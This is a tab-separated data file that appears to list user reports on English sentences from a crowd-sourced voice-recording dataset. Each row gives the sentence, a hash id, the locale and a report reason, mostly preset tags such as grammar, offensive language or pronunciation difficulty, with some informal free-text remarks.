sentence	sentence_id	locale	reason
Flint bracelets were known in Ancient Egypt and several examples have been found.	50e106358d1cb616d5beb63ab6d7f2816ae40ecf1844c0fbd9a8eedf0ed7afce	en	no comment
Alstead lies fully within the Connecticut River watershed.	5124a41419cbe878823807ee563de2c27c1f465e1e5436ba55eec6c3d5d16ac1	en	offensive-language
Alstead lies fully within the Connecticut River watershed.	5124a41419cbe878823807ee563de2c27c1f465e1e5436ba55eec6c3d5d16ac1	en	grammar-or-spelling
Alstead lies fully within the Connecticut River watershed.	5124a41419cbe878823807ee563de2c27c1f465e1e5436ba55eec6c3d5d16ac1	en	different-language
Alstead lies fully within the Connecticut River watershed.	5124a41419cbe878823807ee563de2c27c1f465e1e5436ba55eec6c3d5d16ac1	en	difficult-pronounce
In the league, they finished in third place.	5104ddb44f246c2b472c4a455d36fdded32e1a9dd640e2ebac73c21da31614e0	en	difficult-pronounce
These hopes the Shuttle delivering lower costs would ultimately prove to be hollow.	5121965d9e9dcfad727cd12aa4880558d366db414fe65b5d58cc098dc52453f0	en	grammar-or-spelling
These hopes the Shuttle delivering lower costs would ultimately prove to be hollow.	5121965d9e9dcfad727cd12aa4880558d366db414fe65b5d58cc098dc52453f0	en	grammar-or-spelling
Albright College basketball was also broadcast in a similar manner.	514596f80021f0ccabda53decd2b8768c2d2c8ea0b5bdc939afc79543743dc55	en	Despite my recording volume being okay in general, I keep getting a message saying 'Recording is too quiet'.
He is considered as the 'father of computing age'.	515a293ea4fd8fd81c5655a3ff32ca2cc14932eaecf8570261a8cd1293635fb7	en	different-language
He is considered as the 'father of computing age'.	515a293ea4fd8fd81c5655a3ff32ca2cc14932eaecf8570261a8cd1293635fb7	en	difficult-pronounce
He attended the University of Utah, playing guard and linebacker for the Utes.	51548e9d9642839de2476476d6a34d6caa8a0d2becd4fec78e8a87bde7bccc95	en	offensive-language
He attended the University of Utah, playing guard and linebacker for the Utes.	51548e9d9642839de2476476d6a34d6caa8a0d2becd4fec78e8a87bde7bccc95	en	grammar-or-spelling
He attended the University of Utah, playing guard and linebacker for the Utes.	51548e9d9642839de2476476d6a34d6caa8a0d2becd4fec78e8a87bde7bccc95	en	
It is an urban beach park the attracts thousand of visitors each year.	51415721f0f3a4e1c46df8e405038b1fdff14b4aa1268e312a221f8d5c5ba902	en	grammar-or-spelling
The Bernoulli polynomials and the periodic Bernoulli functions for were introduced above.	513d69d366ac8770d21a0570a18308236388be30c989b8bd919cbc077d5d23c2	en	grammar-or-spelling
Yes she could, and so she did.	5163e35f843c42a24259288dc690aa909bbfe9460aedc4d2fdc0b368537d7e4a	en	different-language
Yes she could, and so she did.	5163e35f843c42a24259288dc690aa909bbfe9460aedc4d2fdc0b368537d7e4a	en	difficult-pronounce
Yes she could, and so she did.	5163e35f843c42a24259288dc690aa909bbfe9460aedc4d2fdc0b368537d7e4a	en	Can never do anything
The road cut across southwestern Pennsylvania, heading southeast for about before entering Maryland.	51c089ca401fb76ec5178f73d64a039d5cf8e1dbb0d1a80215b661839f7a034f	en	grammar-or-spelling
The road cut across southwestern Pennsylvania, heading southeast for about before entering Maryland.	51c089ca401fb76ec5178f73d64a039d5cf8e1dbb0d1a80215b661839f7a034f	en	grammar-or-spelling
The Meiji government established the as an administrative unit.	51b41091d63722641334a234b7f7ed75667698971c6c996223d6adb294d00593	en	grammar-or-spelling
The Meiji government established the as an administrative unit.	51b41091d63722641334a234b7f7ed75667698971c6c996223d6adb294d00593	en	Appears to be missing a word
The Meiji government established the as an administrative unit.	51b41091d63722641334a234b7f7ed75667698971c6c996223d6adb294d00593	en	grammar-or-spelling
The Meiji government established the as an administrative unit.	51b41091d63722641334a234b7f7ed75667698971c6c996223d6adb294d00593	en	Appears to be missing a noun
Cheeses that are classified as to hard include Cheddar.	51bd014e51554dd1c14cfd6bced3ea0656b04a812a7868b4bbfd18b9333ffe09	en	grammar-or-spelling
This demonstrates a lack of, or incomplete, schema of object permanence.	51c7423397703800cdb61c1b9fb534ffabefcf52090942e314a161bc1f2fa77f	en	Not able to record and stating as quite always 
Rowe is a an ambassador and spokesperson for Beyondblue.	51de79a082988535f1b9d68ff9a00b11e768f955ac44f6bf086673114f08eadf	en	grammar-or-spelling
The was named after him.	51d991b5c4c73a9bc1cbcb416f8b3d4e0975821804f66e7e968474d803923adc	en	grammar-or-spelling
The shastras are not consistent or a single consensus documents.	51d23810b3dec7655ee87fa97dad37c229d7098c8b1784a3126d9216fe46f0dc	en	grammar-or-spelling
The road cut across southwestern Pennsylvania, heading southeast for about before entering Maryland.	51c089ca401fb76ec5178f73d64a039d5cf8e1dbb0d1a80215b661839f7a034f	en	grammar-or-spelling
Btw, it's nice weather outside I think.	51f729c30cc6d7ca1d2f4e2a7c13954aa186aba5c7ef81aa6c1e452344f425d7	en	grammar-or-spelling
Btw, it's nice weather outside I think.	51f729c30cc6d7ca1d2f4e2a7c13954aa186aba5c7ef81aa6c1e452344f425d7	en	By the way
Barbra Streisand recorded a duet with her.	52251cd1a76ee4b16a92bdb6cddf0c30f62230b35577ab61f164784c1aac02a2	en	grammar-or-spelling
Ecgfrith's kingdom was said to have been 'weak' on his ascent to the throne.	521785449f255585a37b634fbec9a8a79b6e42d4a221f8e6f79658af4f0e43cc	en	difficult-pronounce
Hudson's Bay Company called it Vancouver Island.	527b706d2bf1b45fcc6be0a5fcf398b66d3a192ba717ab5ace67855155a869b0	en	different-language
Hudson's Bay Company called it Vancouver Island.	527b706d2bf1b45fcc6be0a5fcf398b66d3a192ba717ab5ace67855155a869b0	en	
During World War One, Sir Thomas Lipton helped organizations of medical volunteers.	525bffe2e4e1d6781e6d4bfb9f471dcc38eb1180abfdbcab8fc790cd75031a02	en	offensive-language
During World War One, Sir Thomas Lipton helped organizations of medical volunteers.	525bffe2e4e1d6781e6d4bfb9f471dcc38eb1180abfdbcab8fc790cd75031a02	en	different-language
Several days passed before troops restored full order.	52814ec5e0aada3f65a206e47252ecd7157871615153371794e61a63b2c3df79	en	grammar-or-spelling
Several days passed before troops restored full order.	52814ec5e0aada3f65a206e47252ecd7157871615153371794e61a63b2c3df79	en	
There is a wide range of restaurants, accommodation places and other tourist venues.	527470386c131378e68cea51d08efa9dc820b0445bcab9caf25ea8a55703762c	en	grammar-or-spelling
There is a wide range of restaurants, accommodation places and other tourist venues.	527470386c131378e68cea51d08efa9dc820b0445bcab9caf25ea8a55703762c	en	
Their original content included results of legal proceedings and outcomes of trials.	5280f9757f200256a3b947c89b76b4f4d857e8444cd8cd6c89208136b0c27934	en	grammar-or-spelling
Some growth of working-class consumption occurred, but corresponded to increased indebtedness.	5273d3e123434cd9f36354b0835d784be2ff6c9bbbd3fa1a73d23ad5cfa6bbf5	en	difficult-pronounce
Grafenort station is to the north, one station away.	52596e2cf9cd211ce903c535632fe309fd2c348c0fa665d9e50ce780347ac521	en	offensive-language
Grafenort station is to the north, one station away.	52596e2cf9cd211ce903c535632fe309fd2c348c0fa665d9e50ce780347ac521	en	grammar-or-spelling
Grafenort station is to the north, one station away.	52596e2cf9cd211ce903c535632fe309fd2c348c0fa665d9e50ce780347ac521	en	different-language
Colony is a historically African-American town.	527cfd2bb3d5c9e944d27d3a13bf4f512f06dad1747c18822dc1a23b2c3a25c9	en	offensive-language
Alonzo is now considered a top sculptor.	526c02a642ca7efdef9dd26d2feffbccfe0105a7572f322d0233fea1f6b93d41	en	offensive-language
Alonzo is now considered a top sculptor.	526c02a642ca7efdef9dd26d2feffbccfe0105a7572f322d0233fea1f6b93d41	en	difficult-pronounce
After this last station, tracks run for to reconnect trains to "Auteuil".	51cf49f582c8cc5a8af1f47a46fcfe1dce5a28da3cfae004c16d14cfe73ca946	en	grammar-or-spelling
The current Ambassador to Bahrain is William V. Roebuck.	52863d4c72ff8d03fe562f223b792f6926faa2a839132d0a47aab21766ab720c	en	offensive-language
The current Ambassador to Bahrain is William V. Roebuck.	52863d4c72ff8d03fe562f223b792f6926faa2a839132d0a47aab21766ab720c	en	Xd 
Originally, she blamed herself, but Betty convinced her otherwise.	52989abf09be7c1fb1ae2c55f79198f4be794a0dd4a19d8eef366b6768215005	en	different-language
Originally, she blamed herself, but Betty convinced her otherwise.	52989abf09be7c1fb1ae2c55f79198f4be794a0dd4a19d8eef366b6768215005	en	difficult-pronounce
He is a regular drinker in famous Walkinstown Bar "The Submarine".	5333f4a934f28573a2c8acb9cd20c871c49341dc158b1d60f4ac2ae9374ab05b	en	offensive-language
He is a regular drinker in famous Walkinstown Bar "The Submarine".	5333f4a934f28573a2c8acb9cd20c871c49341dc158b1d60f4ac2ae9374ab05b	en	grammar-or-spelling
He is a regular drinker in famous Walkinstown Bar "The Submarine".	5333f4a934f28573a2c8acb9cd20c871c49341dc158b1d60f4ac2ae9374ab05b	en	different-language
He is a regular drinker in famous Walkinstown Bar "The Submarine".	5333f4a934f28573a2c8acb9cd20c871c49341dc158b1d60f4ac2ae9374ab05b	en	difficult-pronounce
He is a regular drinker in famous Walkinstown Bar "The Submarine".	5333f4a934f28573a2c8acb9cd20c871c49341dc158b1d60f4ac2ae9374ab05b	en	And I loved it

Shakspeare appointed David Hennessy as chief of police.	531ee2d57a3d4394c56583be4eebade76243b24eb0572e2122d9e14a62ffbdaa	en	different-language
Shakspeare appointed David Hennessy as chief of police.	531ee2d57a3d4394c56583be4eebade76243b24eb0572e2122d9e14a62ffbdaa	en	Here's to the freakin weekend, David add the baileys to the he Hennessey and mop the floor with me chief!
Climatology considers the past and can help predict future climate change.	533386b5039d6be3dfcc896e27aef95598af5cf8058fffaf99e96aa20483a2ce	en	grammar-or-spelling
Climatology considers the past and can help predict future climate change.	533386b5039d6be3dfcc896e27aef95598af5cf8058fffaf99e96aa20483a2ce	en	That's no how he spell porridgd

Margam falls within the parliamentary constituency of Aberavon.	5323ffb177e35a2f957ee9de1914c392bba0d5a6219d73f5ec36ab29c1689578	en	grammar-or-spelling
Margam falls within the parliamentary constituency of Aberavon.	5323ffb177e35a2f957ee9de1914c392bba0d5a6219d73f5ec36ab29c1689578	en	Vcnxjxjxjd 

The name "Milagros" may be translated from Spanish by the English word, "miracles".	53308bea4e3eafdf58fa27eb3bc6f6356ce4849f19ac38da3d6db002802ac906	en	Content seems to be 4 using it to brainwash a certain collection of idiots perhaps
Many operators have shifted focus to revenue generating services and reducing operational expenditure.	5348d3487983e3e0534f432669611ea8b94e66021a885e8a7a6890954381f6ed	en	offensive-language
Many operators have shifted focus to revenue generating services and reducing operational expenditure.	5348d3487983e3e0534f432669611ea8b94e66021a885e8a7a6890954381f6ed	en	grammar-or-spelling
Many operators have shifted focus to revenue generating services and reducing operational expenditure.	5348d3487983e3e0534f432669611ea8b94e66021a885e8a7a6890954381f6ed	en	different-language
Many operators have shifted focus to revenue generating services and reducing operational expenditure.	5348d3487983e3e0534f432669611ea8b94e66021a885e8a7a6890954381f6ed	en	difficult-pronounce
This brings many tourists to spend their holidays there.	5321110a69d7a9543b87acf5faed2116798affdcf339597d5fc5796ca68a217c	en	offensive-language
This brings many tourists to spend their holidays there.	5321110a69d7a9543b87acf5faed2116798affdcf339597d5fc5796ca68a217c	en	difficult-pronounce
This brings many tourists to spend their holidays there.	5321110a69d7a9543b87acf5faed2116798affdcf339597d5fc5796ca68a217c	en	
Vorrei spiegarvi, oh Dio!	53b20d33001c5201455cf9560d64e6c79da03ce81e4584720ec6a3c8aef08f56	en	different-language
They carved their names and hearts in the table; "Sixten Hedvig - Ett hjerteminne".	541c8730b53401f5a95047f7365596f6ea9519758a25042b79337a2bd2269578	en	different-language
Thirty years later, the comptroller became head of the department of finance.	54096a558e4c9b1fd748c29f6ca3e9026f3aacee73e9079c3c7947e7a4d97d83	en	grammar-or-spelling
There is some conjecture that the post office was located in the tavern.	540f5d5f751137eebeacb16970ad431bcab1972c0094c452fb91440d11e369eb	en	offensive-language
There is some conjecture that the post office was located in the tavern.	540f5d5f751137eebeacb16970ad431bcab1972c0094c452fb91440d11e369eb	en	grammar-or-spelling
There is some conjecture that the post office was located in the tavern.	540f5d5f751137eebeacb16970ad431bcab1972c0094c452fb91440d11e369eb	en	different-language
He has been active in raising funds for causes such as mathematical education.	542bfbc5ee4e096da5c53ec337f6a5fd8c58932c7ff878ee57a57f5a4c0dbc58	en	offensive-language
He has been active in raising funds for causes such as mathematical education.	542bfbc5ee4e096da5c53ec337f6a5fd8c58932c7ff878ee57a57f5a4c0dbc58	en	grammar-or-spelling
He has been active in raising funds for causes such as mathematical education.	542bfbc5ee4e096da5c53ec337f6a5fd8c58932c7ff878ee57a57f5a4c0dbc58	en	different-language
He has been active in raising funds for causes such as mathematical education.	542bfbc5ee4e096da5c53ec337f6a5fd8c58932c7ff878ee57a57f5a4c0dbc58	en	difficult-pronounce
He has been active in raising funds for causes such as mathematical education.	542bfbc5ee4e096da5c53ec337f6a5fd8c58932c7ff878ee57a57f5a4c0dbc58	en	
The Church offers the tax exemption as proof that it is a religion.	5427dbd26494161cc9d142fb9ac58a4dc33f2d726fe6e30306d5592259ef7371	en	offensive-language
The Church offers the tax exemption as proof that it is a religion.	5427dbd26494161cc9d142fb9ac58a4dc33f2d726fe6e30306d5592259ef7371	en	grammar-or-spelling
The Church offers the tax exemption as proof that it is a religion.	5427dbd26494161cc9d142fb9ac58a4dc33f2d726fe6e30306d5592259ef7371	en	difficult-pronounce
The Church offers the tax exemption as proof that it is a religion.	5427dbd26494161cc9d142fb9ac58a4dc33f2d726fe6e30306d5592259ef7371	en	text
In this verse they follow the Star of Bethlehem to find the infant.	54461dd2c63b3c98fb2259a4eef3c666e091d0cf49b509672ea0e1cfe32a0089	en	offensive-language
In this verse they follow the Star of Bethlehem to find the infant.	54461dd2c63b3c98fb2259a4eef3c666e091d0cf49b509672ea0e1cfe32a0089	en	grammar-or-spelling
In this verse they follow the Star of Bethlehem to find the infant.	54461dd2c63b3c98fb2259a4eef3c666e091d0cf49b509672ea0e1cfe32a0089	en	different-language
In this verse they follow the Star of Bethlehem to find the infant.	54461dd2c63b3c98fb2259a4eef3c666e091d0cf49b509672ea0e1cfe32a0089	en	difficult-pronounce
In this verse they follow the Star of Bethlehem to find the infant.	54461dd2c63b3c98fb2259a4eef3c666e091d0cf49b509672ea0e1cfe32a0089	en	text
It has the highest pig density in the Netherlands.	545272f7d180576bd763cf17c36cf6fb6e01a0ce9c8de7f383ee29bf2c3a7763	en	offensive-language
It has the highest pig density in the Netherlands.	545272f7d180576bd763cf17c36cf6fb6e01a0ce9c8de7f383ee29bf2c3a7763	en	grammar-or-spelling
It has the highest pig density in the Netherlands.	545272f7d180576bd763cf17c36cf6fb6e01a0ce9c8de7f383ee29bf2c3a7763	en	different-language
It has the highest pig density in the Netherlands.	545272f7d180576bd763cf17c36cf6fb6e01a0ce9c8de7f383ee29bf2c3a7763	en	difficult-pronounce
Ville itself was derived from the Latin phrase 'villa rustica,' a countryside home.	545d1ff4dfa102abaeb8fd4711767fb75fbb7129a7889e423edf62dc5921bc8f	en	grammar-or-spelling
'I don't know why.	54e79c861f1486af7fe56b1d8efed62f888edd9a3abee6ce511883e08ba778ea	en	grammar-or-spelling
'The platoon was said to have worked well in Afghanistan.	54e38d2417c194a4aacd2efb330b02ab7ed4471b8c22e01aed2ee1aca6c07839	en	grammar-or-spelling
It has been translated into Chinese, Spanish, and German.	556c9b65919feddbf499065883accc571ddeb4d9e48edcc2919aad481530fa3a	en	different-language
It has been translated into Chinese, Spanish, and German.	556c9b65919feddbf499065883accc571ddeb4d9e48edcc2919aad481530fa3a	en	difficult-pronounce
These previous studies also failed to realistically model the effect of emergency preparedness.	556242352363d6040679f35914703bca49dfb7775eb79f174c1b65edace63381	en	different-language
These previous studies also failed to realistically model the effect of emergency preparedness.	556242352363d6040679f35914703bca49dfb7775eb79f174c1b65edace63381	en	difficult-pronounce
Many flatbreads are unleavened yeast-although some are slightly leavened, such as pita bread.	557a348c518bf6590e96428504570db3aaf5ec109ea7ea65a724a445f522e084	en	offensive-language
Many flatbreads are unleavened yeast-although some are slightly leavened, such as pita bread.	557a348c518bf6590e96428504570db3aaf5ec109ea7ea65a724a445f522e084	en	grammar-or-spelling
Many flatbreads are unleavened yeast-although some are slightly leavened, such as pita bread.	557a348c518bf6590e96428504570db3aaf5ec109ea7ea65a724a445f522e084	en	different-language
